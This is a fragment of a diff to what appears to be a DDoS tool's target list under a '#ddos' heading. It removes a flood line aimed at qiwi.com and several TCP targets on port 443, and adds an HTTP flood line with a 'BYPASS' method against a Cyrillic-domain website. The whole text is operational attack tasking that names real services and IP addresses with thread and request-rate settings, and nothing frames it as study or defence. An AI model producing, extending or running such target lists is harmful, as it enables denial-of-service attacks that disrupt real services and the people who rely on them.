@@ -29,7 +29,6 @@ tcp://79.142.16.20:443 tcp://79.142.16.48:443 tcp://79.142.16.78:443 tcp://79.14
 
 #ddos separiv
 
-https://qiwi.com -t 2000 --rpc 1000 -p 1000 --http-methods BYPASS
-tcp://91.232.230.202:443 tcp://91.232.230.165:443 tcp://91.232.230.135:443 tcp://91.232.230.180:443
+https://xn--80aaanetpw3ba4m.xn--p1ai --http-methods BYPASS
 
 
